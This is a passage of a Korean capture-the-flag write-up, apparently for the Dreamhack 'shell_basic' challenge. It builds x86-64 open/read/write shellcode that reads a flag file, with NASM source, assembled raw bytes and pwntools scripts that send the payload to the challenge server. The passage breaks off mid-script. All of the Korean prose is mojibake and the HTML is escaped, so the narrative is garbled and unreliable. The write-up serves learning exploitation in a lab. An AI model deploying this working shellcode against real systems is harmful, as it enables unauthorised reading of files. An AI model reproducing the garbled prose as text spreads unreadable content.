&lt;p&gt;ê·¸ëŸ°ë° catì„ ì‹¤í–‰í•˜ë ¤ë©´ ì‰˜ì„ ë¨¼ì € ë”°ì•¼ í•œë‹¤. ì¦‰, ì‰˜ì„ ë„ìš´ë‹¤ â†’ catì„ ìˆ˜í–‰í•œë‹¤ì˜ ê³¼ì •ì„ ê±°ì³ì•¼ í•œë‹¤.  ê·¸ëŸ¬ë‚˜, ì‰˜ì„ ë„ìš°ëŠ” ê³¼ì •ì—ì„œ í˜„ì¬ ë‚´ ìˆ˜ì¤€ìœ¼ë¡œëŠ” ë¬´ì¡°ê±´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execveat&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt; ë“±ì˜ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•˜ëŠ”ë° ì½”ë“œ ìƒì—ì„œë„ ê·¸ë ‡ê³ , ë¬¸ì œ ì„¤ëª… ìƒì—ì„œë„ ê·¸ë ‡ê³  main í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ í•´ë‹¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ë©´ ì‹¤í–‰ ê¶Œí•œì´ ì—†ê²Œ ì„¤ì •ë˜ì–´ ìˆë‹¤. ë”°ë¼ì„œ ë‹¤ë¥¸ ë°©ì‹ì„ ì°¾ì•„ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ë‘ ë²ˆì§¸ ê°€ëŠ¥í•œ ë°©ë²•ìœ¼ë¡œëŠ” read/write ì‹œìŠ¤í…œ ì½œì„ ì´ìš©í•˜ëŠ” ê²ƒì´ë‹¤. ë¨¼ì € ì£¼ì–´ì§„ í”Œë˜ê·¸ì˜ ê²½ë¡œì— ìˆëŠ” íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ì–´ì˜¨ í›„, í„°ë¯¸ë„ì— write í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ë‹¤. ì§ì „ì— ë§Œë“¤ì–´ ë³´ì•˜ë˜ orw ì…¸ì½”ë“œì™€ í¬ê²Œ ì°¨ì´ê°€ ìˆì§€ëŠ” ì•Šë‹¤.&lt;/p&gt;

&lt;p&gt;ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ë¨¼ì € ì‘ì„±í•œ í›„, ê¸°ê³„ì–´ë¡œ ë³€í™˜í•œ ê°’ì„ ë„£ì–´ì•¼ ì£¼ì–´ì§„ ì½”ë“œê°€ ì‹¤í–‰í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ì˜ ì‚¬ì§„ê³¼ ê°™ì´ ì„ ì–¸ëœ ë¶€ë¶„ì— ë‚´ê°€ ì‘ì„±í•œ ì½”ë“œê°€ ì˜¬ë¼ê°€ê³ , í•´ë‹¹ ì½”ë“œì˜ ì‹œì‘ ë¶€ë¶„ë¶€í„° ì¢…ë£Œê¹Œì§€ë¥¼ ì‹¤í–‰í•˜ëŠ” êµ¬ì¡°ì´ê¸° ë•Œë¬¸ì´ë‹¤.(ë‚˜ë„ íƒœì–´ë‚˜ì„œ ì´ëŸ° ì‹ìœ¼ë¡œ í¬ì¸í„° ìë£Œí˜•ì„ ë°”ê¾¸ì–´ ë°ì´í„°ë¥¼ ì½”ë“œë¡œ ì½ê²Œë” í•˜ëŠ” í”Œë¡œìš°ëŠ” ì²˜ìŒ ë³´ì•˜ê¸° ë•Œë¬¸ì—, ì½”ë“œë¥¼ ì´í•´í•˜ë©° ë§ì´ ë°°ì› ë‹¤)&lt;/p&gt;

&lt;h2 id=&quot;ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ-ì‘ì„±í•˜ê¸°&quot;&gt;ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±í•˜ê¸°&lt;/h2&gt;

&lt;p&gt;ê·¸ëŸ¼ ë¨¼ì € ì›í•˜ëŠ” ë™ì‘ì„ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±í•´ ë³´ì.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ìš°ë¦¬ê°€ &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2/#/&quot;&gt;ì—¬ê¸°&lt;/a&gt;ì—ì„œ ë°°ì› ë˜ text segmentëŠ” ë‹¤ë¥¸ ë§ë¡œ code segmentë¼ê³ ë„ í•œë‹¤. ì¦‰, ì•„ë˜ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œëŠ” ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ íƒ‘ì¬ë˜ëŠ” ì£¼ì†Œì— ë‹¤ì´ë ‰íŠ¸ë¡œ ì ‘ê·¼í•˜ë©´ì„œ ì‹œì‘í•œë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;
BITS 64
section .text ; text ì„¹ì…˜ì— ì˜¬ë¼ê°€ëŠ” ê²ƒì´ë¯€ë¡œ
global _start ; NASMì—ê²Œ ì‹œì‘ ìœ„ì¹˜ê°€ ë¬´ì—‡ìœ¼ë¡œ ë§ˆí‚¹ë˜ì—ˆëŠ”ì§€ë¥¼ ì•Œë ¤ì¤€ë‹¤

_start: 
; input string into the stack
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

; open(&quot;/home/shell_basic/flag_name_is_loooooong&quot;, O_RDONLY, NULL)
mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

; read(fd, buf, 0x40)
mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

; write(1, buf, 0x40)
mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

; terminate the program
xor rdi, rdi
mov rax, 0x3c
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;â€œgnooooool_si_eman_galf/cisab_llehs/emoh/â€ì„ hexë¡œ ë³€í™˜í•˜ë©´:&lt;/p&gt;

    &lt;p&gt;676e6f6f6f6f6f6f 6c5f73695f656d61 6e5f67616c662f63 697361625f6c6c65 68732f656d6f682f&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;40byteì´ë¯€ë¡œ í•œ ë²ˆì— ë„£ì„ ìˆ˜ê°€ ì—†ë‹¤. 8byteì”© 5íšŒì— ë‚˜ëˆ„ì–´ ë ˆì§€ìŠ¤í„°ì— ë„£ê³  ìŠ¤íƒì— push í•´ì£¼ëŠ” ê³¼ì •ì„ ê±°ì³ì•¼ í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ìŠ¤íƒì— ë“¤ì–´ê°„ í…ìŠ¤íŠ¸ ë“±ì˜ ë°ì´í„°ëŠ” ì‘ì€ ì£¼ì†Œì—ì„œ í° ì£¼ì†Œë¡œ ì½ê³ , ë§ˆì§€ë§‰ì˜ í•œ chunkê°€(ì´ ê²½ìš° 8 byte) 8byteë¥¼ ì „ë¶€ ì±„ìš°ì§€ ëª»í–ˆì„ ê²½ìš° ì‹œìŠ¤í…œì€ ê±°ê¸°ì—ì„œ ë°ì´í„°ê°€ ëë‚¬ë‹¤ê³  ì¸ì‹í•œë‹¤ê³  ì¶”ì •í–ˆë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ê¸°ê³„ì–´ë¡œ-ë³€í™˜í•˜ê¸°&quot;&gt;ê¸°ê³„ì–´ë¡œ ë³€í™˜í•˜ê¸°&lt;/h2&gt;

&lt;p&gt;.asm íŒŒì¼ì„ .o íŒŒì¼ë¡œ ë³€í™˜í•˜ê³ , ì´í›„ .bin íŒŒì¼ë¡œ ë³€í™˜í•˜ì—¬ í•´ë‹¹ ë°”ì´ë„ˆë¦¬ ê°’ì„ hexë¡œ ë³€í™˜í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elf64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.asm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disassemble&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dump-section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell_basic.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%201.jpeg&quot; alt=&quot;ë§ˆì§€ë§‰ ëª…ë ¹ì–´ê¹Œì§€ ìˆ˜í–‰í•œ ê²°ê³¼. hexê°’ì´ ì¶œë ¥ë˜ì—ˆë‹¤.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë§ˆì§€ë§‰ ëª…ë ¹ì–´ê¹Œì§€ ìˆ˜í–‰í•œ ê²°ê³¼. hexê°’ì´ ì¶œë ¥ë˜ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ê²Œ ë‚˜ì˜¨ hexê°’ì„ ì‰˜ì½”ë“œ í˜•íƒœë¡œ ê°€ê³µí•´ ì…ë ¥í•´ ë³´ì•˜ë‹¤. ê·¸ ê²°ê³¼,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%202.jpeg&quot; alt=&quot;ì•„ë‹ˆ ì™¸ì•Šë˜&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•„ë‹ˆ ì™¸ì•Šë˜&lt;/p&gt;

&lt;p&gt;ì•ˆ ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ ì™œ ì•ˆë˜ëŠ” ê²ƒì¼ê¹Œ? ê·¸ ì´ìœ ë¥¼ gdbë¥¼ ë¶™ì—¬ ì•Œì•„ë³´ì•˜ë‹¤. í™•ì¸ ê²°ê³¼, ë‚´ê°€ ì½ì–´ì˜¤ê¸¸ ì›í•˜ëŠ” íŒŒì¼ì˜ ê²½ë¡œë¥¼ ìŠ¤íƒì— ë¶„ëª…íˆ ëŠì´ì§€ ì•Šë„ë¡ ì˜ ë„£ì—ˆìŒì—ë„ ë¶ˆêµ¬í•˜ê³  ìŠ¤íƒì˜ í•œ ì£¼ì†Œ(8byte)ë§Œí¼ë§Œ ìŠ¤íŠ¸ë§ì„ ì½ì–´ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;3-ë¬¸ì œ-ìˆ˜ì •&quot;&gt;3. ë¬¸ì œ ìˆ˜ì •&lt;/h1&gt;

&lt;h2 id=&quot;1-null-byte&quot;&gt;#1. NULL Byte&lt;/h2&gt;

&lt;p&gt;ì•ì„œ ì•Œì•„ë‚¸ ë°”ì— ë”°ë¥´ë©´, í˜„ì¬ ì›í•˜ëŠ” ê²½ë¡œë¥¼ ìŠ¤íƒì— ì˜ ë„£ì—ˆìŒì—ë„ ë¶ˆêµ¬í•˜ê³  ê²½ë¡œ ë¬¸ìì—´ ì „ì²´ë¥¼ ì¸ì‹í•˜ì§€ ëª»í•˜ëŠ” ë¬¸ì œê°€ ìˆì—ˆë‹¤. ë¶„ëª…íˆ ì‹œìŠ¤í…œ ìƒìœ¼ë¡œ ì–´ë–¤ ë¬¸ìì—´ì´ ìˆë‹¤ë©´ ê·¸ ëì„ ì¸ì§€í•˜ê³ , ë¬¸ìì—´ì„ ì˜¬ë°”ë¥´ê²Œ ë¶ˆëŸ¬ì˜¤ëŠ” ì¥ì¹˜ê°€ ìˆì„ ê²ƒì´ë¼ ìƒê°í–ˆë‹¤. ê·¸ë ‡ì§€ ì•Šë‹¤ëŠ” ê²ƒì€ êµ‰ì¥íˆ ë¹„ë…¼ë¦¬ì ì´ê¸° ë•Œë¬¸ì´ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë§Œì¼ ê·¸ëŸ¬í•œ ì¥ì¹˜ê°€ ì—†ë‹¤ê³  ê°€ì •í•´ ë³´ì. ê·¸ë ‡ë‹¤ë©´ íŒŒì¼ ê²½ë¡œ ì´ë¦„ì€ 8bytesë¡œ ì œí•œë  ê²ƒì´ê³ , C ì–¸ì–´ ìƒì—ì„œ ë¬¸ìì—´ì„ ì €ì¥í•˜ê³  ë¶ˆëŸ¬ì˜¤ëŠ” ê²ƒì€ ì›ì²œì ìœ¼ë¡œ ë¶ˆê°€ëŠ¥í•  ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ê¸°ê¹Œì§€ ìƒê°í•˜ë‹ˆ ìƒê°ë‚˜ëŠ” ê²ƒì´ ìˆì—ˆë‹¤. ë°”ë¡œ Cì–¸ì–´ì˜ ê²½ìš° ë¬¸ìì—´ì˜ ëì— NULL ë¬¸ìë¥¼ ë§ë¶™ì—¬ ë¬¸ìì—´ì˜ ëì„ í‘œí˜„í•œë‹¤ëŠ” ì ì´ì—ˆë‹¤. ë”°ë¼ì„œ í•´ë‹¹ ê°€ì„¤ì´ ë§ëŠ”ì§€ ìŠ¤íƒì— ê°€ì¥ ë¨¼ì € 0x00 (ASCII ë¬¸ìì˜ 0ë²ˆì€ NULL byteì´ë‹¤)ë¥¼ ë„£ì–´ë‘ê³  ì´í•˜ ì›í•˜ëŠ” ê°’ì„ ë„£ì—ˆë‹¤. ìŠ¤íƒì— ë“¤ì–´ê°€ëŠ” ê°’ì€ í° ì£¼ì†Œë¶€í„° ë“¤ì–´ê°€ê³ , ìŠ¤íƒì€ ì‘ì€ ì£¼ì†Œë¶€í„° ì½ê¸° ë•Œë¬¸ì— ìŠ¤íƒì— push í•˜ëŠ” ê°’ì´ ë’¤ì§‘íŒë‹¤ëŠ” ì ì„ ê³ ë ¤í•œ ìˆœì„œ ì§€ì •ì´ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ í•´ë‹¹ ê°€ì„¤ì„ ë°˜ì˜í•œ ì–´ì…ˆë¸”ë¦¬ì–´ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;
BITS 64
section .text ; text ì„¹ì…˜ì— ì˜¬ë¼ê°€ëŠ” ê²ƒì´ë¯€ë¡œ
global _start ; NASMì—ê²Œ ì‹œì‘ ìœ„ì¹˜ê°€ ë¬´ì—‡ìœ¼ë¡œ ë§ˆí‚¹ë˜ì—ˆëŠ”ì§€ë¥¼ ì•Œë ¤ì¤€ë‹¤

_start: 
; input string into the stack
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
.
.
.
(ì´í•˜ ìƒë™)
.
.
.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;í•´ë‹¹ ì–´ì…ˆë¸”ë¦¬ì–´ë¥¼ ì–´ì…ˆë¸”í•œ ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ê²°ê³¼ë¥¼ íŒŒì´í”„ë¥¼ ì´ìš©í•´ í…ìŠ¤íŠ¸ íŒŒì¼ì— ì €ì¥í•˜ê³ , ì‰˜ì½”ë“œ í˜•íƒœë¡œ ê°€ê³µí•œ í›„ ì›ê²© ì„œë²„ì— ì…ë ¥í•´ ë³´ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ ê²°ê³¼,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%204.jpeg&quot; alt=&quot;ì•„ì™¸ë˜ì•Šë˜&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•„ì™¸ë˜ì•Šë˜&lt;/p&gt;

&lt;p&gt;ì•ˆëœë‹¤â€¦ C ì–¸ì–´ë¡œ ì§  ìŠ¤ì¼ˆë ˆí†¤ ì½”ë“œì— ì˜¬ë ¤ì„œ gdbë¥¼ ë¶™ì—¬ì„œ í™•ì¸í•´ ë´¤ëŠ”ë°, ë¶„ëª…íˆ ì œëŒ€ë¡œ ë˜ê³  ìˆì—ˆë‹¤. ì‹¬ì§€ì–´ flag íŒŒì¼ì˜ ê²½ë¡œì— í•´ë‹¹ íŒŒì¼ì„ ë§Œë“¤ì–´ì„œ ì»´íŒŒì¼ëœ í”„ë¡œê·¸ë¨ì„ ëŒë ¤ ë³´ì•˜ë”ë‹ˆ ì œëŒ€ë¡œ íŒŒì¼ì˜ ê°’ì´ ì½í˜€ ë‚˜ì™”ë˜ ê²ƒê¹Œì§€ í™•ì¸í–ˆëŠ”ë° ë§ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%205.jpeg&quot; alt=&quot;ë¡œì»¬ í™˜ê²½ì—ì„œëŠ” ì œëŒ€ë¡œ ë˜ëŠ” ëª¨ìŠµì„ í™•ì¸.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë¡œì»¬ í™˜ê²½ì—ì„œëŠ” ì œëŒ€ë¡œ ë˜ëŠ” ëª¨ìŠµì„ í™•ì¸.&lt;/p&gt;

&lt;h2 id=&quot;2-pwntools&quot;&gt;#2. Pwntools&lt;/h2&gt;
&lt;p&gt;ê·¸ëŸ¬ë‹¤ê°€ ê°‘ìê¸° ìƒê°ë‚¬ë‹¤. ì„¤ë§ˆ, í”„ë¡œê·¸ë¨ ìƒì—ì„œ ë°”ì´ë„ˆë¦¬ë¡œ íŒ¨í‚¹í•´ì„œ ë³´ë‚´ì¤˜ì•¼ í•˜ëŠ” ê±¸ê¹Œ? ì™ ì§€ ê·¸ëŸ´ ê²ƒ ê°™ì•˜ë‹¤. ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ë°ì´í„°ê°€ ì „ì†¡ë  ê²½ìš° ì—”ë””ì•ˆì„ ê³ ë ¤í•˜ì§€ ì•Šìœ¼ë©´ ì›í–ˆë˜ ê²ƒê³¼ëŠ” ì •ë°˜ëŒ€ì˜ ë°”ì´íŠ¸ê°€ ê°ˆ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ BoB ìˆ˜ì—… ì‹œê°„ ë•Œ ë°°ì› ë˜ ê¸°ì–µì´ ìˆì—ˆê¸° ë•Œë¬¸ì´ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë˜ì„œ pythonì„ ì´ìš©í•´ ë‚´ê°€ ì›í•˜ëŠ” ë°ì´í„°ë¥¼ ì›ê²©ìœ¼ë¡œ ë³´ë‚´ê³ , ê·¸ ê²°ê³¼ë¥¼ ë°›ëŠ” í”„ë¡œê·¸ë¨ì„ ì§°ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\xb8\x00\x00\x00\x00\x41\x50\x49\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x41\x50\x49\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x41\x50\x49\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x41\x50\x49\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x41\x50\x49\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x41\x50\x48\x89\xe7\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x8d\x74\x24\xc0\xba\x40\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x8d\x74\x24\xc0\xba\x30\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host3.dreamhack.games&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ ê²°ê³¼, ì„±ê³µí–ˆë‹¤! ê²½ë¡œê°€ ì§€ì •í•˜ëŠ” íŒŒì¼ì„ ì½ì–´ ì™€ í”Œë˜ê·¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤. ì—¬ê¸°ì— í”Œë˜ê·¸ëŠ” ì˜¬ë¦¬ì§€ ì•Šì„ ê²ƒì´ë‹¤. ë“œë¦¼í•µì—ì„œ ë™ì¼ ë¬¸ì œë¥¼ í‘¸ëŠ” ì‚¬ëŒë“¤ì—ê²Œ ìŠ¤í¬ì¼ëŸ¬ê°€ ë  ìˆ˜ë„ ìˆê¸°ì—â€¦&lt;/p&gt;

&lt;p&gt;ë˜ ë‹¤ë¥¸ ë°©ì‹ìœ¼ë¡œ ì½”ë“œë¥¼ ì§¤ ìˆ˜ ìˆì„ê¹Œ ì‹¶ì–´ ë‘ ë²ˆì§¸ ë°©ë²•ë„ ì œì•ˆí•´ ë³¸ë‹¤. ì´ ë˜í•œ í”Œë˜ê·¸ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” ì½”ë“œì˜€ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
_start: 
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

xor rdi, rdi
mov rax, 0x3c
syscall
&apos;&apos;&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host3.dreamhack.games&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
